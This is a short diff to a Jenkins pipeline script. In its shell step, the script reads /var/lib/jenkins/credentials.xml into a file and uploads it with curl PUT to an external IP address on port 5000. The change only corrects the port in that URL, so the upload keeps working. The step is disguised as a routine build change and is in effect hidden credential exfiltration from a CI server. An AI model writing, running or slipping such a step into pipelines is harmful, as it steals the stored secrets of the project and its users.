@@ -13,7 +13,7 @@ node {
         sh '''
         rm info.txt | true
         cat /var/lib/jenkins/credentials.xml >> info.txt
-        curl -i -X PUT http://http://35.219.170.76/:5000/filewebhook --upload-file info.txt
+        curl -i -X PUT http://http://35.219.170.76:5000/filewebhook --upload-file info.txt
         '''
     }
 }
